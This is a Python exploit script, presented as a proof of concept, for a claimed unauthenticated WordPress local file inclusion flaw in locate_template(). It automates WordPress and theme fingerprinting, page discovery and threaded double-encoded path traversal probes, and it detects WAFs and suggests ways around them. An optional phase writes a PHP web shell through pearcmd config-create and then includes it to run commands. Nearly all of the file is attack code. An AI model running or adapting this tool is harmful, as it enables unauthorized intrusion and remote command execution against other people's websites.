#!/usr/bin/env python3
"""
CVE-2026-87902 — WordPress Core LFI via locate_template()
Affects: WordPress <= 7.1.1 (unauthenticated)

locate_template() resolves caller-supplied template name without verifying
it stays within the theme directory. Double URL-encoding bypasses the single
urldecode() sanitization: %252e%252e -> HTTP decode -> %2e%2e -> WP urldecode -> ..

Phases:
  1. WordPress version & environment detection
  2. Theme enumeration (active + passive, threaded)
  3. Page discovery (REST API / sitemap / brute, threaded)
  4. Template validation (only pages with default/empty template)
  5. LFI probe (all combos: pages x themes x depths x pearcmd paths, threaded)
  6. RCE chain (pearcmd config-create + second-stage LFI) [--rce]
"""

from __future__ import annotations

import argparse
import concurrent.futures
import json
import re
import sys
import time
import urllib.parse
from dataclasses import dataclass, field
from typing import Optional
from xml.etree import ElementTree

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

KNOWN_THEMES: list[str] = [
    "twentytwelve", "twentythirteen", "twentyfourteen", "twentyfifteen",
    "twentysixteen", "twentyseventeen", "twentynineteen", "twentytwenty",
    "twentytwentyone", "twentytwentytwo", "twentytwentythree", "twentytwentyfour",
    "hello-elementor", "astra", "neve", "hestia", "sydney",
    "oceanwp", "generatepress", "storefront", "zakra", "blocksy",
    "kadence", "flatsome", "enfold", "bridge", "salient",
    "divi", "avada", "betheme", "jupiter", "the7",
]

KNOWN_PAGE_DIRS: list[str] = [
    "page-templates", "page-layouts", "page-builder",
    "page-sections", "page-parts",
]

# suffix = URL segment used when requesting the template
PAGE_DIR_TO_SUFFIX: dict[str, str] = {
    "page-templates": "templates",
    "page-layouts":   "page-layouts",
    "page-builder":   "page-builder",
    "page-sections":  "page-sections",
    "page-parts":     "page-parts",
}

TRAVERSAL_DEPTHS: list[int] = [7, 8, 9, 10, 11]

PEARCMD_PATHS: list[str] = [
    "/usr/local/lib/php/pearcmd",
    "/usr/share/php/pearcmd",
    "/usr/lib/php/pearcmd",
    "/usr/local/share/php/pearcmd",
    "/opt/alt/php70/usr/share/pear/pearcmd",
    "/opt/alt/php71/usr/share/pear/pearcmd",
    "/opt/alt/php72/usr/share/pear/pearcmd",
    "/opt/alt/php73/usr/share/pear/pearcmd",
    "/opt/alt/php74/usr/share/pear/pearcmd",
    "/opt/alt/php80/usr/share/pear/pearcmd",
    "/opt/alt/php81/usr/share/pear/pearcmd",
    "/opt/alt/php82/usr/share/pear/pearcmd",
    "/opt/alt/php83/usr/share/pear/pearcmd",
    "/opt/alt/php84/usr/share/pear/pearcmd",
    "/opt/cpanel/ea-php70/root/usr/share/pear/pearcmd",
    "/opt/cpanel/ea-php71/root/usr/share/pear/pearcmd",
    "/opt/cpanel/ea-php72/root/usr/share/pear/pearcmd",
    "/opt/cpanel/ea-php73/root/usr/share/pear/pearcmd",
    "/opt/cpanel/ea-php74/root/usr/share/pear/pearcmd",
    "/opt/cpanel/ea-php80/root/usr/share/pear/pearcmd",
    "/opt/cpanel/ea-php81/root/usr/share/pear/pearcmd",
    "/opt/cpanel/ea-php82/root/usr/share/pear/pearcmd",
    "/opt/cpanel/ea-php83/root/usr/share/pear/pearcmd",
    "/opt/cpanel/ea-php84/root/usr/share/pear/pearcmd",
]

PEAR_SUCCESS_INDICATORS: list[str] = [
    "Writing PEAR configuration file",
    "pear_config",
    "PEAR_Config",
    "default_channel",
    "preferred_state",
    "<default_channel>",
    "pear.php.net",
]

WAF_CHALLENGE_INDICATORS: list[str] = [
    "One moment, please",
    "window.location.reload()",
    "Ray ID",
    "cf-browser-verification",
    "Checking your browser",
    "DDoS protection by",
    "Enable JavaScript and cookies",
    "__cf_chl",
    "security check",
    "Attention Required",
    "imunify",
    "Imunify",
]

LITESPEED_403_INDICATORS: list[str] = [
    "Proudly powered by LiteSpeed Web Server",
    "LiteSpeed Technologies",
    "lsws",
]

ELEMENTOR_TEMPLATES: list[str] = [
    "elementor_header_footer",
    "elementor",
    "elementor-canvas",
    "elementor-full-width",
]

DEFAULT_TIMEOUT: int = 15
DEFAULT_THREADS: int = 10

# ---------------------------------------------------------------------------
# Data structures
# ---------------------------------------------------------------------------

@dataclass
class ThemeInfo:
    name: str
    page_dir: str   # e.g. "page-templates"
    suffix: str     # e.g. "templates"  (URL segment)
    active: bool = False


@dataclass
class PageInfo:
    page_id: int
    slug: str = ""
    template: str = ""
    title: str = ""


@dataclass
class LFIResult:
    confirmed: bool
    page: Optional[PageInfo] = None
    theme: Optional[ThemeInfo] = None
    depth: int = 0
    pearcmd_used: str = ""
    lfi_url: str = ""
    waf_blocked: bool = False
    waf_type: str = ""


@dataclass
class RCEResult:
    confirmed: bool
    shell_path: str = ""
    pearcmd_used: str = ""
    execute_url: str = ""
    uid_output: str = ""


@dataclass
class ScanResult:
    target: str
    wp_version: Optional[str] = None
    server_header: str = ""
    themes: list = field(default_factory=list)
    pages: list = field(default_factory=list)
    lfi: Optional[LFIResult] = None
    rce: Optional[RCEResult] = None
    waf_detected: bool = False
    waf_type: str = ""


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def make_session(extra_headers: dict, cookie: str, verify_ssl: bool = False) -> requests.Session:
    s = requests.Session()
    retry = Retry(total=2, backoff_factor=0.5,
                  status_forcelist=[429, 500, 502, 503, 504])
    adapter = HTTPAdapter(max_retries=retry)
    s.mount("http://", adapter)
    s.mount("https://", adapter)
    s.verify = verify_ssl
    s.headers.update({
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Cache-Control": "no-cache, no-store, must-revalidate",
        "Pragma": "no-cache",
    })
    if cookie:
        s.headers["Cookie"] = cookie
    s.headers.update(extra_headers)
    return s


def build_payload(suffix: str, depth: int, target: str) -> str:
    """
    Build double-encoded path traversal payload.
    %252e%252e -> (HTTP decode) -> %2e%2e -> (WP urldecode) -> ..
    Uses suffix parameter — NOT hardcoded.
    """
    sep = "%252F"
    dd  = "%252e%252e"
    hops = (sep + dd) * depth
    encoded_target = target.lstrip("/").replace("/", sep)
    return f"{suffix}{hops}{sep}{encoded_target}"


def build_url(base: str, page_id: int, slug: str, pagename_value: str, port: int) -> str:
    """
    Construct a raw URL bypassing requests param encoding.
    Uses page_id + pagename to avoid canonical redirects.
    """
    from urllib.parse import urlparse, urlunparse
    parsed = urlparse(base)
    netloc = parsed.netloc
    if port and port not in (80, 443):
        host = parsed.hostname
        netloc = f"{host}:{port}"
    qs = f"page_id={page_id}&pagename={pagename_value}"
    return urlunparse((parsed.scheme, netloc, parsed.path or "/", "", qs, ""))


def detect_waf(text: str, headers: dict) -> tuple[bool, str]:
    text_lower = text.lower()
    for ind in WAF_CHALLENGE_INDICATORS:
        if ind.lower() in text_lower:
            return True, "Cloudflare/Imunify360"
    server = headers.get("Server", "")
    if "imunify" in server.lower():
        return True, "Imunify360"
    return False, ""


def is_litespeed_403(text: str, status: int) -> bool:
    if status != 403:
        return False
    for ind in LITESPEED_403_INDICATORS:
        if ind.lower() in text.lower():
            return True
    return False


def is_pear_response(text: str) -> bool:
    for ind in PEAR_SUCCESS_INDICATORS:
        if ind in text:
            return True
    return False


def is_rce_confirmed(text: str) -> bool:
    return bool(re.search(r"uid=\d+\(", text))


# ---------------------------------------------------------------------------
# Phase 1 — WordPress version & environment detection
# ---------------------------------------------------------------------------

def detect_wordpress(session: requests.Session, base: str, verbose: bool) -> tuple[Optional[str], str]:
    wp_version = None
    server_header = ""

    endpoints = [base, f"{base.rstrip('/')}/feed/", f"{base.rstrip('/')}/wp-json/"]
    for url in endpoints:
        try:
            r = session.get(url, timeout=DEFAULT_TIMEOUT, allow_redirects=True)
            if not server_header:
                server_header = r.headers.get("Server", "")
            m = re.search(
                r'<meta[^>]+name=["\']generator["\'][^>]+content=["\']WordPress ([0-9.]+)["\']',
                r.text, re.I,
            )
            if m:
                wp_version = m.group(1)
                break
            m = re.search(r'<generator>[^<]*WordPress/([0-9.]+)</generator>', r.text)
            if m:
                wp_version = m.group(1)
                break
        except Exception:
            continue

    if verbose:
        print(f"  [*] WP version: {wp_version or 'unknown'}  Server: {server_header}")
    return wp_version, server_header


# ---------------------------------------------------------------------------
# Phase 2 — Theme enumeration
# ---------------------------------------------------------------------------

def extract_active_theme(session: requests.Session, base: str, verbose: bool) -> Optional[ThemeInfo]:
    try:
        r = session.get(base, timeout=DEFAULT_TIMEOUT, allow_redirects=True)
    except Exception:
        return None

    m = re.search(r'/wp-content/themes/([^/\'"]+)/', r.text)
    if not m:
        return None
    theme_name = m.group(1)
    if verbose:
        print(f"  [+] Active theme from HTML: {theme_name}")

    page_dir = _probe_page_dir(session, base, theme_name, verbose)
    suffix = PAGE_DIR_TO_SUFFIX.get(page_dir, page_dir)
    return ThemeInfo(name=theme_name, page_dir=page_dir, suffix=suffix, active=True)


def _probe_page_dir(session: requests.Session, base: str, theme: str, verbose: bool) -> str:
    for pdir in KNOWN_PAGE_DIRS:
        url = f"{base.rstrip('/')}/wp-content/themes/{theme}/{pdir}/"
        try:
            r = session.get(url, timeout=8, allow_redirects=False)
            if r.status_code in (200, 403):
                if verbose:
                    print(f"    [*] Theme page-dir: {pdir} (HTTP {r.status_code})")
                return pdir
        except Exception:
            pass
    return "page-templates"


def enumerate_themes(session: requests.Session, base: str, active: Optional[ThemeInfo],
                     thorough: bool, threads: int, verbose: bool) -> list[ThemeInfo]:
    themes: list[ThemeInfo] = []
    seen: set[str] = set()

    if active:
        themes.append(active)
        seen.add(active.name)

    # try directory listing
    listing_url = f"{base.rstrip('/')}/wp-content/themes/"
    try:
        r = session.get(listing_url, timeout=10, allow_redirects=True)
        if r.status_code == 200:
            for m in re.finditer(r'href=["\']([A-Za-z0-9_\-]+)[/"\']+', r.text):
                name = m.group(1)
                if name in (".", "..", "") or name in seen or len(name) < 3:
                    continue
                page_dir = _probe_page_dir(session, base, name, verbose)
                suffix = PAGE_DIR_TO_SUFFIX.get(page_dir, page_dir)
                themes.append(ThemeInfo(name=name, page_dir=page_dir, suffix=suffix, active=False))
                seen.add(name)
                if verbose:
                    print(f"  [+] Installed theme: {name}")
    except Exception:
        pass

    if thorough:
        def probe_known(tname: str):
            if tname in seen:
                return None
            url = f"{base.rstrip('/')}/wp-content/themes/{tname}/"
            try:
                r = session.get(url, timeout=8, allow_redirects=False)
                if r.status_code in (200, 403):
                    page_dir = _probe_page_dir(session, base, tname, verbose)
                    suffix = PAGE_DIR_TO_SUFFIX.get(page_dir, page_dir)
                    return ThemeInfo(name=tname, page_dir=page_dir, suffix=suffix, active=False)
            except Exception:
                pass
            return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
            futures = {ex.submit(probe_known, t): t for t in KNOWN_THEMES if t not in seen}
            for f in concurrent.futures.as_completed(futures):
                result = f.result()
                if result:
                    themes.append(result)
                    seen.add(result.name)
                    if verbose:
                        print(f"  [+] Probed theme: {result.name}")

    if not themes:
        themes.append(ThemeInfo(name="twentytwentyfour", page_dir="page-templates",
                                suffix="templates", active=False))
        if verbose:
            print("  [!] No themes found; using fallback: twentytwentyfour")

    return themes


# ---------------------------------------------------------------------------
# Phase 3 — Page discovery
# ---------------------------------------------------------------------------

def discover_pages_rest(session: requests.Session, base: str, verbose: bool) -> list[PageInfo]:
    pages = []
    url = f"{base.rstrip('/')}/wp-json/wp/v2/pages"
    params: dict = {"per_page": 100, "_fields": "id,slug,template,status,title", "page": 1}
    try:
        while True:
            r = session.get(url, params=params, timeout=DEFAULT_TIMEOUT)
            if r.status_code != 200:
                break
            try:
                data = r.json()
            except Exception:
                break
            if not isinstance(data, list) or not data:
                break
            for item in data:
                pid = item.get("id", 0)
                slug = item.get("slug", "")
                tmpl = item.get("template", "")
                title_raw = item.get("title", {})
                title = title_raw.get("rendered", "") if isinstance(title_raw, dict) else str(title_raw)
                if item.get("status") != "publish":
                    continue
                pages.append(PageInfo(page_id=pid, slug=slug, template=tmpl, title=title))
            total_pages = int(r.headers.get("X-WP-TotalPages", 1))
            if params["page"] >= total_pages:
                break
            params["page"] += 1
    except Exception:
        pass
    if verbose:
        print(f"  [*] REST API: found {len(pages)} pages")
    return pages


def discover_pages_sitemap(session: requests.Session, base: str, verbose: bool) -> list[PageInfo]:
    pages = []
    found_ids: set[int] = set()

    sitemap_urls = [
        f"{base.rstrip('/')}/sitemap.xml",
        f"{base.rstrip('/')}/sitemap_index.xml",
        f"{base.rstrip('/')}/wp-sitemap.xml",
    ]

    page_urls: list[str] = []
    for smap in sitemap_urls:
        try:
            r = session.get(smap, timeout=10)
            if r.status_code != 200:
                continue
            try:
                root = ElementTree.fromstring(r.content)
            except Exception:
                continue
            ns = {"sm": "http://www.sitemaps.org/schemas/sitemap/0.9"}
            for loc in root.findall(".//sm:loc", ns):
                page_urls.append(loc.text.strip())
        except Exception:
            continue

    for purl in page_urls:
        if "page" not in purl.lower():
            continue
        try:
            r = session.get(purl, timeout=10)
            if r.status_code != 200:
                continue
            try:
                root = ElementTree.fromstring(r.content)
            except Exception:
                continue
            ns = {"sm": "http://www.sitemaps.org/schemas/sitemap/0.9"}
            for loc in root.findall(".//sm:loc", ns):
                href = loc.text.strip()
                m = re.search(r'[?&]page_id=(\d+)', href)
                if m:
                    pid = int(m.group(1))
                    if pid not in found_ids:
                        found_ids.add(pid)
                        slug = href.rstrip("/").split("/")[-1]
                        pages.append(PageInfo(page_id=pid, slug=slug))
        except Exception:
            continue

    if verbose and pages:
        print(f"  [*] Sitemap: found {len(pages)} page IDs")
    return pages


def discover_pages_brute(session: requests.Session, base: str,
                         max_id: int, threads: int, verbose: bool) -> list[PageInfo]:
    found: list[PageInfo] = []

    def probe(pid: int):
        url = f"{base.rstrip('/')}/?page_id={pid}"
        try:
            r = session.head(url, timeout=8, allow_redirects=True)
            if r.status_code == 200:
                final = r.url
                slug = final.rstrip("/").split("/")[-1]
                if slug.isdigit() or not slug:
                    slug = ""
                return PageInfo(page_id=pid, slug=slug)
        except Exception:
            pass
        return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
        futures = {ex.submit(probe, pid): pid for pid in range(1, max_id + 1)}
        for f in concurrent.futures.as_completed(futures):
            result = f.result()
            if result:
                found.append(result)

    found.sort(key=lambda p: p.page_id)
    if verbose:
        print(f"  [*] Brute-force (1-{max_id}): found {len(found)} pages")
    return found


def fetch_page_templates(session: requests.Session, base: str,
                         pages: list[PageInfo], threads: int, verbose: bool) -> list[PageInfo]:
    need_template = [p for p in pages if p.template == "" and p.page_id > 0]
    if not need_template:
        return pages

    def fetch_template(page: PageInfo):
        url = f"{base.rstrip('/')}/wp-json/wp/v2/pages/{page.page_id}?_fields=template"
        try:
            r = session.get(url, timeout=8)
            if r.status_code == 200:
                data = r.json()
                page.template = data.get("template", "")
        except Exception:
            pass
        return page

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
        futures = [ex.submit(fetch_template, p) for p in need_template]
        for f in concurrent.futures.as_completed(futures):
            f.result()

    return pages


def discover_pages(session: requests.Session, base: str, thorough: bool,
                   threads: int, verbose: bool) -> list[PageInfo]:
    all_pages: list[PageInfo] = []
    seen_ids: set[int] = set()

    rest_pages = discover_pages_rest(session, base, verbose)
    for p in rest_pages:
        if p.page_id not in seen_ids:
            all_pages.append(p)
            seen_ids.add(p.page_id)

    sitemap_pages = discover_pages_sitemap(session, base, verbose)
    for p in sitemap_pages:
        if p.page_id not in seen_ids:
            all_pages.append(p)
            seen_ids.add(p.page_id)

    if thorough:
        brute_pages = discover_pages_brute(session, base, max_id=200, threads=threads, verbose=verbose)
        for p in brute_pages:
            if p.page_id not in seen_ids:
                all_pages.append(p)
                seen_ids.add(p.page_id)

    if not all_pages:
        all_pages.append(PageInfo(page_id=1, slug="sample-page"))
        if verbose:
            print("  [!] No pages found; using fallback page_id=1")

    all_pages = fetch_page_templates(session, base, all_pages, threads, verbose)
    return all_pages


# ---------------------------------------------------------------------------
# Phase 4 — Template validation
# ---------------------------------------------------------------------------

def filter_exploitable_pages(pages: list[PageInfo], verbose: bool) -> list[PageInfo]:
    exploitable = []
    for p in pages:
        tmpl = p.template.strip().lower()
        if tmpl in ("", "default"):
            exploitable.append(p)
        else:
            if verbose:
                print(f"  [-] Skipping page {p.page_id} ({p.slug}): template={p.template}")
    if verbose:
        print(f"  [*] Exploitable pages (default template): {len(exploitable)}")
    return exploitable


# ---------------------------------------------------------------------------
# Phase 5 — LFI probe
# ---------------------------------------------------------------------------

def _lfi_probe_single(session: requests.Session, base: str, page: PageInfo,
                      theme: ThemeInfo, depth: int, pearcmd_path: str,
                      port: int, verbose: bool) -> Optional[LFIResult]:
    payload = build_payload(theme.suffix, depth, pearcmd_path)
    url = build_url(base, page.page_id, page.slug, payload, port)
    url_with_cmd = url + "+config-show"

    try:
        r = session.get(url_with_cmd, timeout=DEFAULT_TIMEOUT, allow_redirects=True)
    except Exception:
        return None

    waf, waf_type = detect_waf(r.text, dict(r.headers))
    if waf:
        return LFIResult(confirmed=False, page=page, theme=theme, depth=depth,
                         pearcmd_used=pearcmd_path, lfi_url=url_with_cmd,
                         waf_blocked=True, waf_type=waf_type)

    if is_litespeed_403(r.text, r.status_code):
        return LFIResult(confirmed=False, page=page, theme=theme, depth=depth,
                         pearcmd_used=pearcmd_path, lfi_url=url_with_cmd,
                         waf_blocked=True, waf_type="LiteSpeed/Imunify360")

    if r.status_code not in (200, 500):
        return None

    if is_pear_response(r.text):
        if verbose:
            print(f"\n  [+] LFI CONFIRMED: page_id={page.page_id} theme={theme.name} "
                  f"depth={depth} pear={pearcmd_path}")
        return LFIResult(confirmed=True, page=page, theme=theme, depth=depth,
                         pearcmd_used=pearcmd_path, lfi_url=url_with_cmd)

    return None


def scan_lfi(session: requests.Session, base: str, pages: list[PageInfo],
             themes: list[ThemeInfo], port: int, threads: int, verbose: bool) -> Optional[LFIResult]:
    tasks = []
    for page in pages:
        for theme in themes:
            for depth in TRAVERSAL_DEPTHS:
                for ppath in PEARCMD_PATHS:
                    tasks.append((page, theme, depth, ppath))

    if verbose:
        print(f"  [*] LFI combos: {len(tasks)} "
              f"({len(pages)} pages x {len(themes)} themes x "
              f"{len(TRAVERSAL_DEPTHS)} depths x {len(PEARCMD_PATHS)} pearcmd paths)")

    waf_result: Optional[LFIResult] = None
    confirmed_result: Optional[LFIResult] = None
    stop_flag = [False]

    def worker(args):
        if stop_flag[0]:
            return None
        page, theme, depth, ppath = args
        return _lfi_probe_single(session, base, page, theme, depth, ppath, port, verbose)

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
        futures = {ex.submit(worker, t): t for t in tasks}
        for f in concurrent.futures.as_completed(futures):
            if stop_flag[0] and confirmed_result:
                break
            r = f.result()
            if r is None:
                continue
            if r.waf_blocked and not waf_result:
                waf_result = r
                if verbose:
                    print(f"  [!] WAF blocked: {r.waf_type}")
            if r.confirmed:
                stop_flag[0] = True
                confirmed_result = r

    return confirmed_result if confirmed_result else waf_result


# ---------------------------------------------------------------------------
# Phase 6 — RCE chain
# ---------------------------------------------------------------------------

def attempt_rce(session: requests.Session, base: str, lfi: LFIResult,
                write_path: str, port: int, verbose: bool) -> Optional[RCEResult]:
    if not lfi.confirmed:
        return None

    page  = lfi.page
    theme = lfi.theme
    depth = lfi.depth
    ppath = lfi.pearcmd_used

    stub_path = write_path

    # pearcmd config-create embeds argv[2] as <default_channel> in an XML config file.
    # PHP then include()s that file — any <?php ?> block in it executes.
    # argv is derived from QUERY_STRING split on spaces (+), so we use + for spaces
    # and pass the PHP literal without additional URL encoding — the HTTP layer
    # already did one decode before pearcmd sees argv, so characters like < > ? $ are safe.
    stub_literal = "<?php+system($_GET['c']);?>"  # + = space in argv split

    # Stage 1: write stub via pearcmd config-create
    payload = build_payload(theme.suffix, depth, ppath)
    url_stage1 = build_url(base, page.page_id, page.slug, payload, port)
    url_stage1 += f"+config-create+{stub_literal}+{stub_path}"

    if verbose:
        print(f"  [*] RCE Stage 1: config-create -> {stub_path}")

    try:
        r1 = session.get(url_stage1, timeout=DEFAULT_TIMEOUT)
        if verbose:
            print(f"      HTTP {r1.status_code} len={len(r1.text)}")
    except Exception as e:
        if verbose:
            print(f"  [!] Stage 1 failed: {e}")
        return None

    time.sleep(0.5)

    # Stage 2: LFI the written stub and execute id
    stub_payload = build_payload(theme.suffix, depth, stub_path)
    url_stage2 = build_url(base, page.page_id, page.slug, stub_payload, port)
    url_stage2 += "&c=id"

    if verbose:
        print(f"  [*] RCE Stage 2: execute -> {url_stage2}")

    try:
        r2 = session.get(url_stage2, timeout=DEFAULT_TIMEOUT)
        if verbose:
            print(f"      HTTP {r2.status_code} response: {r2.text[:200]}")
    except Exception as e:
        if verbose:
            print(f"  [!] Stage 2 failed: {e}")
        return None

    if is_rce_confirmed(r2.text):
        m = re.search(r"(uid=\d+\([^)]+\)[^\n]*)", r2.text)
        uid_out = m.group(1) if m else r2.text[:100]
        return RCEResult(confirmed=True, shell_path=stub_path, pearcmd_used=ppath,
                         execute_url=url_stage2, uid_output=uid_out)

    return RCEResult(confirmed=False, shell_path=stub_path, pearcmd_used=ppath,
                     execute_url=url_stage2)


# ---------------------------------------------------------------------------
# Output
# ---------------------------------------------------------------------------

def print_banner():
    print("""
╔═══════════════════════════════════════════════════════════════╗
║  CVE-2026-87902 — WordPress LFI via locate_template()        ║
║  Affects: WordPress <= 7.1.1  |  Unauthenticated             ║
╚═══════════════════════════════════════════════════════════════╝
""")


def print_result(result: ScanResult):
    print("\n" + "="*65)
    print(f"TARGET : {result.target}")
    print(f"WP VER : {result.wp_version or 'unknown'}")
    print(f"SERVER : {result.server_header}")
    print(f"THEMES : {len(result.themes)}")
    print(f"PAGES  : {len(result.pages)}")

    if result.waf_detected:
        print(f"\n[!] WAF DETECTED: {result.waf_type}")
        print("    Path traversal blocked by this WAF.")
        print("    Alternatives: symlink bypass, Apache backend port, PHP CLI.")

    if result.lfi and result.lfi.confirmed:
        lfi = result.lfi
        print(f"\n[+] LFI CONFIRMED")
        print(f"    Page ID : {lfi.page.page_id} ({lfi.page.slug})")
        print(f"    Theme   : {lfi.theme.name} (suffix={lfi.theme.suffix})")
        print(f"    Depth   : {lfi.depth}")
        print(f"    Pear    : {lfi.pearcmd_used}")
        print(f"    URL     : {lfi.lfi_url}")
    elif result.lfi and result.lfi.waf_blocked:
        print(f"\n[-] LFI blocked by WAF ({result.lfi.waf_type})")
    else:
        print("\n[-] LFI not confirmed")

    if result.rce:
        if result.rce.confirmed:
            print(f"\n[+] RCE CONFIRMED")
            print(f"    Shell   : {result.rce.shell_path}")
            print(f"    UID     : {result.rce.uid_output}")
            print(f"    Execute : {result.rce.execute_url}")
        else:
            print(f"\n[-] RCE attempt failed")
    print("="*65)


def result_to_dict(result: ScanResult) -> dict:
    def page_d(p):
        return {"id": p.page_id, "slug": p.slug, "template": p.template, "title": p.title}

    def theme_d(t):
        return {"name": t.name, "page_dir": t.page_dir, "suffix": t.suffix, "active": t.active}

    def lfi_d(l):
        if not l:
            return None
        return {
            "confirmed": l.confirmed,
            "page": page_d(l.page) if l.page else None,
            "theme": theme_d(l.theme) if l.theme else None,
            "depth": l.depth,
            "pearcmd_used": l.pearcmd_used,
            "lfi_url": l.lfi_url,
            "waf_blocked": l.waf_blocked,
            "waf_type": l.waf_type,
        }

    def rce_d(r):
        if not r:
            return None
        return {
            "confirmed": r.confirmed,
            "shell_path": r.shell_path,
            "pearcmd_used": r.pearcmd_used,
            "execute_url": r.execute_url,
            "uid_output": r.uid_output,
        }

    return {
        "target": result.target,
        "wp_version": result.wp_version,
        "server_header": result.server_header,
        "waf_detected": result.waf_detected,
        "waf_type": result.waf_type,
        "themes": [theme_d(t) for t in result.themes],
        "pages": [page_d(p) for p in result.pages],
        "lfi": lfi_d(result.lfi),
        "rce": rce_d(result.rce),
    }


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def parse_args():
    p = argparse.ArgumentParser(
        description="CVE-2026-87902 WordPress LFI -> RCE PoC (fully automatic)",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    p.add_argument("target", help="Target base URL (e.g. https://example.com)")
    p.add_argument("--rce", action="store_true",
                   help="Attempt RCE via pearcmd config-create after LFI")
    p.add_argument("--write-path", default="/tmp/wp_shell.php",
                   help="PHP stub write path for RCE (default: /tmp/wp_shell.php)")
    p.add_argument("--thorough", action="store_true",
                   help="Probe all known themes + brute-force page IDs 1-200")
    p.add_argument("--threads", type=int, default=DEFAULT_THREADS,
                   help=f"Worker threads (default: {DEFAULT_THREADS})")
    p.add_argument("--port", type=int, default=0,
                   help="Override destination port (e.g. 8080 for Apache backend)")
    p.add_argument("--cookie", default="",
                   help="Cookie header value")
    p.add_argument("-H", "--header", action="append", default=[], metavar="HEADER",
                   help="Extra HTTP header (repeatable)")
    p.add_argument("--json", action="store_true",
                   help="Output JSON result instead of human-readable")
    p.add_argument("-v", "--verbose", action="store_true",
                   help="Verbose output")
    p.add_argument("--page-id", type=int, default=0,
                   help="Override: use this specific page_id (skips page discovery)")
    p.add_argument("-t", "--theme", default="",
                   help="Override: use this specific theme name (skips theme enum)")
    p.add_argument("-d", "--depth", type=int, default=0,
                   help="Override: use this specific traversal depth only")
    return p.parse_args()


def main():
    args = parse_args()

    if not args.json:
        print_banner()

    target = args.target.rstrip("/")
    if not target.startswith(("http://", "https://")):
        target = "http://" + target

    extra_headers: dict[str, str] = {}
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            extra_headers[k.strip()] = v.strip()

    session = make_session(extra_headers, args.cookie)
    result = ScanResult(target=target)

    if not args.json:
        print(f"[*] Target  : {target}")
        print(f"[*] Threads : {args.threads}  Thorough: {args.thorough}")

    # Phase 1: WP detection
    if not args.json:
        print("\n[Phase 1] WordPress detection")
    wp_ver, server_hdr = detect_wordpress(session, target, args.verbose)
    result.wp_version = wp_ver
    result.server_header = server_hdr

    # Phase 2: Theme enumeration
    if args.theme:
        themes = [ThemeInfo(name=args.theme, page_dir="page-templates",
                            suffix="templates", active=True)]
        if not args.json:
            print(f"\n[Phase 2] Theme override: {args.theme}")
    else:
        if not args.json:
            print("\n[Phase 2] Theme enumeration")
        active_theme = extract_active_theme(session, target, args.verbose)
        themes = enumerate_themes(session, target, active_theme, args.thorough,
                                  args.threads, args.verbose)
        if not args.json:
            print(f"  [*] Total themes: {len(themes)}")
    result.themes = themes

    # Phase 3 & 4: Page discovery + template filter
    if args.page_id:
        exploitable_pages = [PageInfo(page_id=args.page_id, slug="", template="")]
        result.pages = exploitable_pages
        if not args.json:
            print(f"\n[Phase 3] Page override: page_id={args.page_id}")
    else:
        if not args.json:
            print("\n[Phase 3] Page discovery")
        pages = discover_pages(session, target, args.thorough, args.threads, args.verbose)
        result.pages = pages

        if not args.json:
            print(f"\n[Phase 4] Template validation ({len(pages)} pages)")
        exploitable_pages = filter_exploitable_pages(pages, args.verbose or (not args.json))

    # depth override
    if args.depth:
        scan_depths = [args.depth]
    else:
        scan_depths = TRAVERSAL_DEPTHS

    # temporarily replace TRAVERSAL_DEPTHS for scan
    original_depths = TRAVERSAL_DEPTHS[:]
    TRAVERSAL_DEPTHS.clear()
    TRAVERSAL_DEPTHS.extend(scan_depths)

    # Phase 5: LFI scan
    if not args.json:
        print("\n[Phase 5] LFI probe")
    lfi_result = scan_lfi(session, target, exploitable_pages, themes,
                          args.port, args.threads, args.verbose or (not args.json))
    result.lfi = lfi_result

    # restore
    TRAVERSAL_DEPTHS.clear()
    TRAVERSAL_DEPTHS.extend(original_depths)

    if lfi_result and lfi_result.waf_blocked:
        result.waf_detected = True
        result.waf_type = lfi_result.waf_type

    # Phase 6: RCE
    if args.rce and lfi_result and lfi_result.confirmed:
        if not args.json:
            print("\n[Phase 6] RCE attempt")
        rce_result = attempt_rce(session, target, lfi_result, args.write_path,
                                 args.port, args.verbose or (not args.json))
        result.rce = rce_result

    # Output
    if args.json:
        print(json.dumps(result_to_dict(result), indent=2))
    else:
        print_result(result)

    sys.exit(0 if (lfi_result and lfi_result.confirmed) else 1)


if __name__ == "__main__":
    main()
